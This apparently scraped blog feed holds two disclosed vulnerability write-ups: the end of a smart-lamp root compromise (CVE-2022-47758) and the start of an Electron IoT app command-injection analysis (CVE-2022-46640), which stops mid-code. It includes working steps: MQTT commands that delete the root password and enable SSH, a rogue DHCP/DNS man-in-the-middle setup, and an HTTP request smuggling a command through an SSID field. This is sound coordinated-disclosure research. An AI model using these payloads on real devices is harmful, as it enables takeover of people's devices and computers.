/etc/mosquitto/certs/ca.crt
$ mosquitto_pub -L mqtts://127.0.0.1:443/acme/device/serialno/exec/server -m &quot;stop&quot; --insecure --cafile /etc/mosquitto/certs/ca.crt
$ mosquitto_pub -L mqtts://127.0.0.1:443/acme/device/serialno/exec/server -m &quot;debug /bin/passwd -d root&quot; --insecure --cafile /etc/mosquitto/certs/ca.crt
$ mosquitto_pub -L mqtts://127.0.0.1:443/acme/device/serialno/exec/server -m &quot;stop&quot; --insecure --cafile /etc/mosquitto/certs/ca.crt
$ mosquitto_pub -L mqtts://127.0.0.1:443/acme/device/serialno/exec/server -m &quot;debug /sbin/reboot&quot; --insecure --cafile /etc/mosquitto/certs/ca.crt</code></pre><figcaption><p><span style="white-space: pre-wrap;">Sending our payloads to our own MQTT broker</span></p></figcaption></figure><p>Once we started the OpenSSH server on the smart lamp, we can log into our smart lamp by simply executing <code>ssh root@192.168.128.20</code>.</p><pre><code class="language-bash">$ ssh root@192.168.128.20

root@192.168.128.20:~ $ uname -a
Linux AcmeProduct-MAC 4.14.195 #0 Sun Sep 6 16:19:39 2020 mips GNU/Linux</code></pre><h2 id="analyzing-the-smart-device-firmware">Analyzing the smart device firmware</h2><p>Since we have access to the firmware, we can analyze the firmware by extracting it using Binwalk - a tool for analyzing and extracting firmware. By running it with the <code>-e</code> (<code>--extract</code>) parameter, we can extract the firmware partitions. In our case, we can see that we have 3 partitions: a bootloader, a kernel, and an OpenWRT install (interestingly enough). </p><figure class="kg-card kg-code-card"><pre><code class="language-bash">$ binwalk -e 4.5.1.firmware

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
80            0x50            uImage header, header size: 64 bytes, header CRC: 0xF012020D, created: 2020-09-06 16:19:39, image size: 1594132 bytes, Data Address: 0x80000000, Entry Point: 0x80000000, data CRC: 0xFB832D09, OS: Linux, CPU: MIPS, image type: OS Kernel Image, compression type: lzma, image name: &quot;MIPS OpenWrt Linux-4.14.195&quot;
144           0x90            LZMA compressed data, properties: 0x6D, dictionary size: 8388608 bytes, uncompressed size: 5029060 bytes
1594276       0x1853A4        Squashfs filesystem, little endian, version 4.0, compression:xz, size: 7060690 bytes, 1210 inodes, blocksize: 262144 bytes, created: 2020-09-06 16:19:39</code></pre><figcaption><p><span style="white-space: pre-wrap;">Binwalk output when extracting the firmware</span></p></figcaption></figure><h3 id="enumerating-the-openwrt-installation">Enumerating the OpenWRT installation</h3><p>The output of Binexp is a SquashFS filesystem instance which got carved out of the extracted partition. SquashFS performs heavy compressions and hence it probably was used by the smart lamp developers because it saves storage costs. Since SquashFS doesn&apos;t have different layers such as OverlayFS, we do not have any hassle regarding fixing the FS.</p><figure class="kg-card kg-code-card"><pre><code class="language-bash">$ tree . -L 2
.
&#x251C;&#x2500;&#x2500; 4.5.1.firmware
&#x2514;&#x2500;&#x2500; squashfs
    &#x251C;&#x2500;&#x2500; bin
    &#x251C;&#x2500;&#x2500; dev
    &#x251C;&#x2500;&#x2500; etc
    &#x251C;&#x2500;&#x2500; lib
    &#x251C;&#x2500;&#x2500; mnt
    &#x251C;&#x2500;&#x2500; acme_config
    &#x251C;&#x2500;&#x2500; overlay
    &#x251C;&#x2500;&#x2500; proc
    &#x251C;&#x2500;&#x2500; rom
    &#x251C;&#x2500;&#x2500; root
    &#x251C;&#x2500;&#x2500; sbin
    &#x251C;&#x2500;&#x2500; sys
    &#x251C;&#x2500;&#x2500; tmp
    &#x251C;&#x2500;&#x2500; usr
    &#x251C;&#x2500;&#x2500; var -&gt; tmp
    &#x2514;&#x2500;&#x2500; www</code></pre><figcaption><p><span style="white-space: pre-wrap;">The output directory of binwalk</span></p></figcaption></figure><p>One of the first things we did was verifying with what OS we were working and checking which users existed on the device. After we established that the lamp was running OpenWRT - a router OS interestingly enough - and we couldn&apos;t find any custom users in <code>/etc/passwd</code>, we decided to look into the next interesting directory: <code>/acme_config/</code>.</p><figure class="kg-card kg-code-card"><pre><code class="language-bash">$ cat etc/os-release                 
NAME=&quot;OpenWrt&quot;
VERSION=&quot;19.07.4&quot;
ID=&quot;openwrt&quot;
ID_LIKE=&quot;lede openwrt&quot;
PRETTY_NAME=&quot;OpenWrt 19.07.4&quot;
VERSION_ID=&quot;19.07.4&quot;
HOME_URL=&quot;https://openwrt.org/&quot;
BUG_URL=&quot;https://bugs.openwrt.org/&quot;
SUPPORT_URL=&quot;https://forum.openwrt.org/&quot;
BUILD_ID=&quot;r11208-ce6496d796&quot;
OPENWRT_BOARD=&quot;ramips/mt76x8&quot;
OPENWRT_ARCH=&quot;mipsel_24kc&quot;
OPENWRT_TAINTS=&quot;no-all busybox&quot;
OPENWRT_DEVICE_MANUFACTURER=&quot;OpenWrt&quot;
OPENWRT_DEVICE_MANUFACTURER_URL=&quot;https://openwrt.org/&quot;
OPENWRT_DEVICE_PRODUCT=&quot;Generic&quot;
OPENWRT_DEVICE_REVISION=&quot;v0&quot;
OPENWRT_RELEASE=&quot;OpenWrt 19.07.4 r11208-ce6496d796&quot;</code></pre><figcaption><p><code spellcheck="false" style="white-space: pre-wrap;"><span>/etc/os-release</span></code><span style="white-space: pre-wrap;"> - OS related information</span></p></figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-bash">$ cat etc/passwd
root:x:0:0:root:/root:/bin/ash
daemon:*:1:1:daemon:/var:/bin/false
ftp:*:55:55:ftp:/home/ftp:/bin/false
network:*:101:101:network:/var:/bin/false
nobody:*:65534:65534:nobody:/var:/bin/false
dnsmasq:x:453:453:dnsmasq:/var/run/dnsmasq:/bin/false</code></pre><figcaption><p><code spellcheck="false" style="white-space: pre-wrap;"><span>/etc/passwd</span></code><span style="white-space: pre-wrap;"> - users on the device</span></p></figcaption></figure><p>We started searching in <code>/acme_config/</code> for interesting keywords such as <code>grep -iRPe &apos;(ssh)|(mqtt)|(ftp)|(api)&apos;</code> to find possible exposed services as an attack surface. As we researched the binaries containing the specified keywords, we found out that a particular binary called <code>ColorCC.bin</code> contained the entire smart lamp API accessible via HTTP (built using the OpenAPI C++ SDK). We tried searching for memory corruption bugs for easy RCE but could not find any. Next, a binary called <code>cloud_daemon</code> caught our attention because it contained an MQTT client...</p><h3 id="investigating-the-mqtt-handler">Investigating the MQTT handler</h3><p>In order to grasp the internal logic of the <code>cloud_daemon</code>, we can open it in Ghidra. Ghidra is a software reverse engineering suite developed by the National Security Agency (NSA). We can use Ghidra to decompile Assembly instructions (the raw instructions that go into the CPU) into normal C, which is relatively readable by code monkeys like us.</p><figure class="kg-card kg-code-card"><pre><code class="language-c">void main(int argc,char **env)
{
  int iVar1;
  long lVar2;
  int i;
  char **ppcVar3;
  long port;
  char *pcVar4;
  char addr_str [128];
  pthread_t pThread;
  undefined4 uStack_34;
  char *pcStack_30;
  
  printf(&quot;This is Cloud Daemon version %s (%s)\n&quot;,&quot;1.12.0&quot;,
         &quot;1.12.0 / Wed Aug 26 09:08:45 EDT 2020 / Backlog0740 / Color_develop&quot;);
  signal(2,ctrlc_handler);
  signal(0xf,ctrlc_handler);
  memset(addr_str,0,0x80);
  port = 0;
  do {
    if (argc &lt;= 1) {
      // set MQTT channel variables
      sprintf(&amp;update_server,&quot;acme/device/%s/update/server&quot;,&amp;ROM_SERIAL_NUMBER);
      sprintf(&amp;update_client,&quot;acme/device/%s/update/client&quot;,&amp;ROM_SERIAL_NUMBER);
      sprintf(&amp;exec_server,&quot;acme/device/%s/exec/server&quot;,&amp;ROM_SERIAL_NUMBER);
      sprintf(&amp;exec_client,&quot;acme/device/%s/exec/client&quot;,&amp;ROM_SERIAL_NUMBER);
      sprintf(&amp;uptime_server,&quot;acme/device/%s/uptime/server&quot;,&amp;ROM_SERIAL_NUMBER);
      sprintf(&amp;uptime_client,&quot;acme/device/%s/uptime/client&quot;,&amp;ROM_SERIAL_NUMBER);

      // print which MQTT channels will be used for what
      printlog(3,&quot;We will publish firmware communications to [%s]\n&quot;,&amp;update_client);
      printlog(3,&quot;We will receive firmware communications from [%s]\n&quot;,&amp;update_server);
      printlog(3,&quot;We will publish debug communications to [%s]\n&quot;,&amp;exec_client);
      printlog(3,&quot;We will receive debug communications from [%s]\n&quot;,&amp;exec_server);
      printlog(3,&quot;We will publish health communications to [%s]\n&quot;,&amp;uptime_client);
      printlog(3,&quot;We will receive health communications from [%s]\n&quot;,&amp;uptime_server);
      
      set_host(addr_str, port);
     
      // creates posix thread to execute the start_firmware_checks() function
      while (iVar1 = pthread_create(&amp;pThread, NULL, start_firmware_checks, &amp;DAT_00414c84), iVar1 != 0 ) {
        printlog(1,&quot;Error creating https upgrade check thread, retrying in %d seconds ...\n&quot;,timeout);
        printlog(1,&quot;Error in (func, line): %s, %d\n&quot;, &amp;function, 0x41f);
        sleep(timeout);
      }

      printlog(2, &quot;Successfully launched https upgrade check thread\n&quot;);
      cloud_pipe_start(&amp;ROM_DEVICE_ID,&amp;ROM_SERIAL_NUMBER, channel, on_disconnect_cb, on_tick_cb, 1000);
      if (DAT_004152f0 != 0) {
        printlog(2, &quot;Rebooting\n&quot;);
        system(&quot;reboot&quot;);
      }
      return;
    }
}
</code></pre><figcaption><p><code spellcheck="false" style="white-space: pre-wrap;"><span>main()</span></code><span style="white-space: pre-wrap;"> function - initializes the MQTT client channels</span></p></figcaption></figure><figure class="kg-card kg-code-card"><pre><code>Client will publish firmware communications to [acme/device/serialno/update/client]
Client will receive firmware communications from [acme/device/serialno/update/server]
Client will publish debug communications to [acme/device/serialno/exec/client]
Client will receive debug communications from [acme/device/serialno/exec/server]
Client will publish health communications to [acme/device/serialno/uptime/client]
Client will receive health communications from [acme/device/serialno/uptime/server]</code></pre><figcaption><p><span style="white-space: pre-wrap;">Communication channels used by MQTT client</span></p></figcaption></figure><p>We can see that <code>cloud_pipe_start()</code> (<code>libcloudpipe.so</code>) is called in <code>main()</code>, which registers several callback functions: <code>cloud_pipe_start(..., ..., register_channels, on_disconnect_cb, on_tick_cb, ...)</code>. The function <code>register_channels</code> is a wrapper for registering handlers for the MQTT channels discussed above.</p><figure class="kg-card kg-code-card"><pre><code class="language-c">void register_channels(void)
{
  printlog(2,&quot;Connection up\n&quot;);
  cloud_pipe_subscribe(&amp;uptime_server,respond_healthcheck);
  cloud_pipe_subscribe(&amp;update_server,update_firmware);
  cloud_pipe_subscribe(&amp;exec_server,debug);
  return;
}</code></pre><figcaption><p><code spellcheck="false" style="white-space: pre-wrap;"><span>register_channels()</span></code><span style="white-space: pre-wrap;"> - registers the MQTT message handlers per MQTT channel</span></p></figcaption></figure><p>The most interesting handler function sounds like <code>debug</code>, which handles messages on the channel <code>/acme/device/serialno/exec/server</code>. This function handles debug requests: it can execute a binary (debug a process) based on the MQTT requests parameters, or kill the process (stop the debugging). In order to start debugging a binary, we can publish the following the the server exec channel: <code>debug /bin/echo &quot;Hello World!&quot;</code>, of which &quot;Hello World!&quot; should be nicely returned in an MQTT message on the channel <code>/acme/device/serialno/exec/client</code>. When we want to execute another binary or generally stop debugging, we can simply issue a <code>stop</code> command.</p><p>So far, I hope that the following part of the MQTT payload in the PoC exploit makes sense:</p><figure class="kg-card kg-code-card"><pre><code class="language-bash"># create a file called /acme_config/ssh_enabled by &apos;debugging&apos; /bin/touch
$ mosquitto_pub -L mqtts://127.0.0.1:443/acme/device/serialno/exec/server -m &quot;debug /bin/touch /acme/ssh_enabled&quot; --insecure --cafile /etc/mosquitto/certs/ca.crt

# stop debugging so we can execute another command
$ mosquitto_pub -L mqtts://127.0.0.1:443/acme/device/serialno/exec/server -m &quot;stop&quot; --insecure --cafile /etc/mosquitto/certs/ca.crt

# delete (reset) the root password by &apos;debugging&apos; /bin/passwd
$ mosquitto_pub -L mqtts://127.0.0.1:443/acme/device/serialno/exec/server -m &quot;debug /bin/passwd -d root&quot; --insecure --cafile /etc/mosquitto/certs/ca.crt

# stop debugging so we can execute another command
$ mosquitto_pub -L mqtts://127.0.0.1:443/acme/device/serialno/exec/server -m &quot;stop&quot; --insecure --cafile /etc/mosquitto/certs/ca.crt

# reboot to start the OpenSSH server, but we can probably do it without reboot
$ mosquitto_pub -L mqtts://127.0.0.1:443/acme/device/serialno/exec/server -m &quot;debug /sbin/reboot&quot; --insecure --cafile /etc/mosquitto/certs/ca.crt</code></pre><figcaption><p><span style="white-space: pre-wrap;">A rewind to the PoC exploit payload commands</span></p></figcaption></figure><h3 id="investigating-the-communication-protocol">Investigating the communication protocol</h3><p>Now we have a primitive for our exploit: a debugging endpoint which could be abused if we could send messages on the <code>/acme/device/serialno/exec/server</code> channel of the MQTT broker. Mind you, it would cause CHAOS if this MQTT broker could be hacked to allow an attacker to send messages to all devices connected to the MQTT broker. Since we don&apos;t want to try to hack the vendor since it would be cybercrime, we aren&apos;t going to test the official MQTT broker, so we tried to find ways to MitM the traffic going to <code>mqtt.acme.org</code>, however we couldn&apos;t succeed since it used TLS... But - we asked ourselves - what if the TLS configuration was insecure? E.g. an insecure version?</p><p>In order to find the TLS configuration, we dug into the functions that were called to setup the MQTT client: <code>cloud_pipe_subscribe</code> and <code>cloud_pipe_start</code>. By running a simple <code>grep -iRe &apos;cloud_pipe_subscribe&apos;</code> query again, we can see that our function is originating from <code>/acme_config/acme_programs/libcloudpipe.so</code>.</p><figure class="kg-card kg-code-card"><pre><code class="language-bash">$ grep -iRe &apos;cloud_pipe_subscribe&apos;
grep: lib/libcloudpipe.so: binary file matches
grep: acme_config/acme_programs/cloud_daemon: binary file matches
grep: acme_config/acme_programs/libcloudpipe.so: binary file matches
grep: sbin/cloud_daemon: binary file matches</code></pre><figcaption><p><code spellcheck="false" style="white-space: pre-wrap;"><span>grep</span></code><span style="white-space: pre-wrap;"> - utility for searching strings</span></p></figcaption></figure><p>An interesting part of the <code>cloud_pipe_start()</code> function is the subsystem where a TLS network connection gets initiated by <code>ConnectNetwork()</code> and the MQTTClient gets initiated by <code>MQTTClient()</code>. We can find the TLS configuration in <code>ConnectNetwork()</code> and I quickly identified the used TLS library as <a href="https://github.com/Mbed-TLS/mbedtls">mbedtls</a>. Whilst searching for documentation of the used functions in the mbedtls library, I found out that the parameter <code>MBEDTLS_SSL_VERIFY_NONE</code> gets passed to the configuration function <code>mbedtls_ssl_conf_authmode</code>. This means that <strong>TLS certifications are not validated...</strong></p><figure class="kg-card kg-code-card"><pre><code class="language-c">  sprintf(port_str,&quot;%d&quot;,port);
  printf(&quot;  . Connecting to %s:%s...&quot;,addr,port_str);
  fd_stdout = stdout;
  fflush(stdout);
  param1 = mbedtls_net_connect(&amp;ctx_net,addr,port_str,0);
  if (param1 != 0) {
    printf(&quot; failed\n  ! mbedtls_net_connect returned %d\n\n&quot;,param1);
    return -1;
  }
  puts(&quot; ok&quot;);
  initiated_seed = 0;
  printf(&quot;  . Setting up the SSL/TLS structure...&quot;);
  fflush(fd_stdout);
  pcVar4 = (char *)0x0;
  pcVar3 = (code *)0x0;
  success = mbedtls_ssl_config_defaults((undefined4 *)&amp;ssl_config,0,0,0);
  if ((int *)success == (int *)0x0) {
    puts(&quot; ok&quot;);

    // mbedtls_ssl_conf_authmode() - Set the certificate verification mode
    // 
    // #define MBEDTLS_SSL_VERIFY_NONE 0
    mbedtls_ssl_conf_authmode((int)&amp;ssl_config,0);
    mbedtls_ssl_conf_rng(ssl_config, mbedtls_ctr_drbg_random, &amp;ctx_ctr_drbg_init);
    pcVar3 = (code *)fd_stdout;
    mbedtls_ssl_conf_dbg((int)&amp;ssl_config,&amp;LAB_0002d068,fd_stdout);
    success = mbedtls_ssl_setup((undefined4 *)&amp;DAT_00100838,&amp;ssl_config);</code></pre><figcaption><p><code spellcheck="false" style="white-space: pre-wrap;"><span>ConnectNetwork()</span></code><span style="white-space: pre-wrap;"> - create the TLS connection to a server</span></p></figcaption></figure><p>We have the final piece.</p><h2 id="creating-a-proof-of-concept-exploit">Creating a Proof of Concept exploit</h2><p>The primitives in our exploit are complete: we have a dangerous debugging endpoint listening to a server which can be eavesdropped. Now it&apos;s a matter of performing a Man-in-the-Middle (MitM) attack on the MQTT broker and creating a payload to send.</p><p>We have plenty of options to MitM network traffic when the TLS certifications aren&apos;t verified, but our favorite approach is using a rogue DHCP server to serve fake DNS records. We picked the <code>isc-dhcp-server</code> DHCP service because it works on Linux and because it&apos;s very customizable. We&apos;re using option <code>domain-name-server</code> to set the DNS server to <code>192.168.128.10</code> on the smart lamp. This means that if the lamp requests <code>mqtt.acme.org</code>, it will be resolved by our own DNS resolver over at <code>192.168.128.10</code></p><p>We used <code>bind9</code> as a DNS resolver in order to create fake DNS zones/records. We created a basic type A (IPv4) DNS record for <code>mqtt.acme.org</code> which redirects to our own MQTT broker <code>192.168.128.10</code>. Usually these kind of attacks are prevented by verifying the TLS certifications of the broker as a client, but the smart lamp did not perform those verification checks. </p><p>For the final serice we needed an MQTT broker, for which we chose <code>mosquitto</code>. We didn&apos;t configure it at all and just made sure that it was possible to publish and subscribe to any MQTT channels. However, we had to make sure that our service was running on port 443 (which is typically used for HTTPS), that it supported TLS, and that anonymous logins were allowed (anonymous login means that any username/password is allowed to login). </p><p>Now we have our entire infrastructure up and running, we need to send the payload commands to our own MQTT broker. We can easily use the <code>mosquitto_pub</code> utility for this to publish our own messages to specific channels. Additionally, we can use the <code>mosquitto_sub</code> utility for subscribing to other channels so that we can receive stdout from the smart lamp. In order to easily get our very own OpenSSH server we need to create a file called <code>/acme_config/ssh_enabled</code> and reboot. However, <code>root</code> is the only user with a default shell (<code>/bin/ash</code>)  but we don&apos;t know its password. </p><figure class="kg-card kg-code-card"><pre><code>$ cat etc/passwd
root:x:0:0:root:/root:/bin/ash
daemon:*:1:1:daemon:/var:/bin/false
ftp:*:55:55:ftp:/home/ftp:/bin/false
network:*:101:101:network:/var:/bin/false
nobody:*:65534:65534:nobody:/var:/bin/false
dnsmasq:x:453:453:dnsmasq:/var/run/dnsmasq:/bin/false</code></pre><figcaption><p><code spellcheck="false" style="white-space: pre-wrap;"><span>/etc/passwd</span></code><span style="white-space: pre-wrap;"> - contains user information</span></p></figcaption></figure><p>We can overwrite the root password using <code>passwd -d</code> which resets the password to be empty, and the OpenSSH will gladly accept that. This means that we can essentially start an OpenSSH server using <code>touch /acme_config/ssh_enabled &amp;&amp; passwd -d &amp;&amp; reboot</code>. However, in practice our commands get executed using <code>execv(char* filepath, char** argv)</code>. This means that we need to execute the commands seperately with the full path. Hence, our payload is as follows:</p><pre><code class="language-bash">$ mosquitto_pub -L mqtts://127.0.0.1:443/acme/device/serialno/exec/server -m &quot;debug /bin/touch /acme/ssh_enabled&quot; --insecure --cafile /etc/mosquitto/certs/ca.crt
$ mosquitto_pub -L mqtts://127.0.0.1:443/acme/device/serialno/exec/server -m &quot;stop&quot; --insecure --cafile /etc/mosquitto/certs/ca.crt
$ mosquitto_pub -L mqtts://127.0.0.1:443/acme/device/serialno/exec/server -m &quot;debug /bin/passwd -d root&quot; --insecure --cafile /etc/mosquitto/certs/ca.crt
$ mosquitto_pub -L mqtts://127.0.0.1:443/acme/device/serialno/exec/server -m &quot;stop&quot; --insecure --cafile /etc/mosquitto/certs/ca.crt
$ mosquitto_pub -L mqtts://127.0.0.1:443/acme/device/serialno/exec/server -m &quot;debug /sbin/reboot&quot; --insecure --cafile /etc/mosquitto/certs/ca.crt</code></pre><p>When we execute this, we start the OpenSSH server and we can log in as root:</p><pre><code class="language-bash">$ ssh root@192.168.128.20

root@192.168.128.20:~$ whoami
root</code></pre><h2 id="conclusion">Conclusion</h2><p>As we have discovered in this article, a critical vulnerability was found in many, many IoT smart lighting devices, allowing attackers to gain control over the entire device and access sensitive information. This serves as a reminder of the importance of IoT security for both vendors and consumers.</p><p>As consumers, we can follow these best practices to enhance the security of our home network:</p><ol><li>Keep devices&apos; software up-to-date to prevent vulnerabilities from being exploited.</li><li>Keep smart devices on a separate sub-network to reduce privacy concerns.</li><li>Use long passwords (even pass-sentences) and two-factor authentication where possible.</li><li>Disable unused or unnecessary services and ports on devices.</li></ol><p>As developers, we can implement the following best practices to ensure the security of our IoT devices:</p><ol><li>Conduct thorough security assessments and penetration testing to identify and fix vulnerabilities before deploying devices.</li><li>Implement encryption and authentication mechanisms to secure data transmitted between the device and the server.</li><li>Use secure coding practices and avoid insecure software libraries.</li><li>Regularly update and patch devices to fix security vulnerabilities (and do it fast :-) ).</li></ol><p>By following these best practices, we can reduce the risk of security breaches and ensure the safety and security of our connected devices and home networks.</p><p>Furthermore, the vulnerabilities in said smart lamps were patched by the vendor in early January 2023, about a month after coordinated vulnerability disclosure. The vendor gave us explicit permission to publish this blogpost - under the agreement we wouldn&apos;t mention the vendors name nor product name - and gave us permission to publish <code>CVE-2022-47758</code>. </p><p></p><p>We hope this blogpost has been as interesting to read for you as it was for us to write, and thank you for taking the time to read this blogpost.</p><p>Notselwyn, March 2023</p>]]></content:encoded></item><item><title><![CDATA[How I hacked IoT management apps: the story behind CVE-2022-46640]]></title><description><![CDATA[<p>Have you ever wondered how secure desktop applications really are? Recently, we put one of them to the test and found some critical vulnerabilities such as unauthenticated Remote Code Execution (CVE-2022-46640), Local File Inclusion and Remote Wireless Reconfiguration which allowed us to remotely compromise the Windows desktop. In this blogpost,</p>]]></description><link>https://pwning.tech/cve-2022-46640/</link><guid isPermaLink="false">658f44f8d32e980001de21f0</guid><category><![CDATA[Web Exploitation]]></category><category><![CDATA[Real World]]></category><dc:creator><![CDATA[notselwyn]]></dc:creator><pubDate>Wed, 08 Mar 2023 07:30:00 GMT</pubDate><content:encoded><![CDATA[<p>Have you ever wondered how secure desktop applications really are? Recently, we put one of them to the test and found some critical vulnerabilities such as unauthenticated Remote Code Execution (CVE-2022-46640), Local File Inclusion and Remote Wireless Reconfiguration which allowed us to remotely compromise the Windows desktop. In this blogpost, we&apos;re going to share our experience hacking into a desktop app with a very large number of downloads, and explain how we were able to do it. Whether you&apos;re a developer, a security researcher, or just someone curious about software security, you won&apos;t want to miss this interesting write-up. So, let&apos;s dive in!</p><h2 id="content">Content</h2><ol><li>Introduction to IoT desktop apps</li><li>Proof of Concept exploit</li><li>Analyzing the IoT desktop app</li><li>Creating a Proof of Concept exploit</li><li>Conclusion</li></ol><h2 id="introduction-to-iot-desktop-apps">Introduction to IoT desktop apps</h2><p>Smart lighting has evolved beyond just mobile apps. With the rise of desktop apps, managing smart lights has become even more convenient. Desktop apps for smart lighting allow users to manage their smart lights from their computers, with some apps offering unique features like a more user-friendly interface or advanced automation options.</p><p>Desktop apps for smart lighting can pose security risks, including potential vulnerabilities that hackers could exploit to <a href="https://pwning.tech/cve-2022-47758">gain access to a user&apos;s smart lights</a> and even the desktop itself... To minimize these risks, users should download apps from trusted sources, and especially update apps and operating systems regularly. Additionally users can separate IoT networks from normal networks.</p><p>The desktop app we managed to exploit was written in Electron with an back-end server written in Express.js. The back-end Express.js server was accessible from any device which meant that remote exploitation was possible. &#xA0;</p><h2 id="proof-of-concept-exploit">Proof of Concept exploit</h2><p>In order to exploit the command injection vulnerability (which leads to unauthenticated RCE) we can send a mere HTTP request as Proof of Concept (PoC). The root cause is a command injection vulnerability in an unauthenticated Express.js API endpoint on the device that changes the active WiFi network. This &quot;intended&quot; WiFi reconfiguration functionality itself is an RWR vulnerability because an attacker can set up their own malicious WiFi network and make the target device connect to it to eavesdrop it.</p><p>The code that causes this command injection vulnerability is located in the Windows WiFi network subsystem of the application. We can supply a malicious access point SSID in the HTTP request which allows us to inject our own commands into <code>execCommand()</code>.</p><figure class="kg-card kg-code-card"><pre><code class="language-js">function connect(ap) { 
    console.log(&quot;using windows wifi handler&quot;);
    return scan().then((networks) =&gt; { ...
    }).then(() =&gt; {
        return execCommand(&apos;netsh wlan add profile filename=&quot;nodeWifiConnect.xml&quot;&apos;);
    }).then(() =&gt; {
        return execCommand(`netsh wlan connect ssid=&quot;${ap.name}&quot; name=&quot;${ap.name}&quot;`);
    }).then(() =&gt; { ...
    }).catch((err) =&gt; {
        console.warn(&quot;windowsWifi connectToWifi Error:&quot;, err);
        return execCommand(`netsh wlan delete profile &quot;${ap.name}&quot;`).then(() =&gt; {
            return Promise.reject(err);
        });
    });
}</code></pre><figcaption><code>connect(ap)</code> - the code that contains the command injection vulnerability</figcaption></figure><p>The payload in the malicious HTTP request is a JSON body including the new WiFi SSID and the new WiFi password. We can supply an SSID that escapes the command <code>netsh wlan delete profile &quot;${ap.name}&quot;</code> to exploit it. An example of such SSID is <code>{&quot;name&quot;: &quot;\&quot;&amp;calc.exe&amp;::&quot;}</code> - in which <code>&amp;</code> is used to background the command and <code>::</code> to comment out everything that follows.</p><figure class="kg-card kg-code-card"><pre><code class="language-http">POST /validateWifiPassword HTTP/1.1
Host: target.local:56751
Content-Length: 75
Content-Type: application/json

{&quot;new_network&quot;:{&quot;name&quot;:&quot;attacker_ssid&quot;,&quot;password&quot;:&quot;attacker_pass&quot;}}</code></pre><figcaption>HTTP request for the typical credential check</figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-http">POST /validateWifiPassword HTTP/1.1
Host: target.local:56751
Content-Length: 75
Content-Type: application/json

{&quot;new_network&quot;:{&quot;name&quot;:&quot;\&quot;&amp;calc.exe&amp;::&quot;,&quot;password&quot;:&quot;attacker_pass&quot;}}</code></pre><figcaption>HTTP request containing our own payload which executes calc.exe</figcaption></figure><p>This proof of concept payload spawns the Windows calculator on the desktop of the vulnerable target device. According to our research it is possible to make a fully fletched shell that can upload files, download files, and execute commands all while using native vulnerabilities we found in the app. Those vulnerabilities like LFI, LFW, et cetera have been patched by the vendor due to our research as well.</p><h2 id="analyzing-the-iot-desktop-app">Analyzing the IoT desktop app</h2><p>In order to find vulnerabilities in the desktop app, we need to get our hands on the code. To find the relevant code, I tried searching in the app directory for strings that get shown when running the app. If the app was a compiled PE executable we should still get results. Using <code>grep -iRe &quot;Sign In&quot;</code> we can find the file <code>app.asar</code>. An ASAR file turns out to be a source code package for an Electron app. We found the <a href="https://github.com/electron/asar">asar</a> tool developed by Electron themselves and used it to extract the source code from the ASAR file using <code>asar e app.asar out</code>. </p><p>The first thing we researched when we got access to the source code was finding the entrypoint of the application. Since the project structure looked an aweful lot like an Express.js webserver, we started looking for the initialization of the webserver to find the host, port and routes. It turns out that the ports are provided in an environment and that the app listens to port 56751 and binds to 0.0.0.0 (due to its lack of providing an interface). </p><p>The fact that the server binds to 0.0.0.0 is the root cause of all vulnerabilities listed in this blogpost. Because the interface doesn&apos;t bind to just localhost (a.k.a. 127.0.0.1), any device on the network can connect to the webserver. This is fundamentally not necessary in this usecase and it&apos;s making exploitation possible from other devices. If the server binded to 127.0.0.1 instead, there wouldn&apos;t be RCE since remote devices would be able to communicate with the webserver. </p><figure class="kg-card kg-code-card"><pre><code class="language-js">  production: {
    env: &apos;production&apos;,
    root: rootPath,
    app: {
      name: &apos;device-monitor-server&apos;
    },
    port: 56751,
    redis: {
        host: process.env.REDIS_ADDRESS,
        port: 6379
    }
  }</code></pre><figcaption><code>config/config.js</code> - containing information about the environment</figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-js">
global.App = {
    app: app,
    env: env,
    server: http.createServer(app),
    config: require(&apos;./config/config&apos;),
    port: require(&apos;./config/config&apos;).port,
    // ...
    start: function() {
        if (!this.started) {
            // ...
            this.server.listen(this.port)
            console.log(&quot;Operating System :&quot;, process.platform);
            console.log(&quot;Running App Version &quot; + App.version + &quot; on port &quot; + App.port + &quot; in &quot; + App.env + &quot; mode&quot;)
        }
    }
}
</code></pre><figcaption><code>application.js</code> <code>-</code> binding to <code>0.0.0.0:56751</code></figcaption></figure><p>Since we found out that the webserver binds to 0.0.0.0:56751, we can now start looking for API routes, since the Electron app uses those to manage the smart lights. After running a few grep queries for &quot;routes&quot;, we found <code>config/routes.js</code>. This file contains more than 60 API routes from actions like managing the smart devices to changing WiFi settings on the host. </p><figure class="kg-card kg-code-card"><pre><code class="language-js">// ...

app.get(&apos;/network/info&apos;, EncryptionController.getCurrentNetworkInfo);
app.post(&apos;/network/reconnect&apos;, EncryptionController.reconnectToNetwork);
app.get(&apos;/wides&apos;, EncryptionController.getWifis);

app.post(&apos;/validateWifiPassword&apos;, EncryptionController.validateWifiPassword);

app.post(&apos;/wac/device&apos;, dnssdController.enableWACMode, EncryptionController.connectDeviceToNetwork, dnssdController.disableWACMode, dnssdController.getDevices);

// ...</code></pre><figcaption><code>config/routes.js</code> - containing the routes of the app</figcaption></figure><p>We analysed nearly all 60 endpoints and found plenty of vulnerabilities - all of which can be exploited remotely because the server binds to <code>0.0.0.0</code>. We started analysing the endpoints with a priority on dangerous endpoints - the endpoints which call command execution functions. We searched for those using <code>grep -iRe &quot;execCommand&quot;</code>, which only gave <code>app/utils/windowsWifi.js</code> back. Analysing this file gave the following dangerous functions:</p><figure class="kg-card kg-code-card"><pre><code class="language-js">function execCommand(cmd) {
    return new Promise((resolve, reject) =&gt; {
        exec(cmd, env, (err, stdout, stderr) =&gt; { /* ... */ });
    });
}</code></pre><figcaption><code>execCommand</code> - the primary dangerous function being used</figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-js">function connect(ap) { 
    console.log(&quot;using windows wifi handler&quot;);
    return scan().then((networks) =&gt; { // ... 
    }).then(() =&gt; { // ...
    }).then(() =&gt; {
        return execCommand(`netsh wlan connect ssid=&quot;${ap.name}&quot; name=&quot;${ap.name}&quot;`);
    }).then(() =&gt; { // ...
    }).catch((err) =&gt; {
        console.warn(&quot;windowsWifi connectToWifi Error:&quot;, err);
        return execCommand(`netsh wlan delete profile &quot;${ap.name}&quot;`).then(() =&gt; { // ...
        });
    });
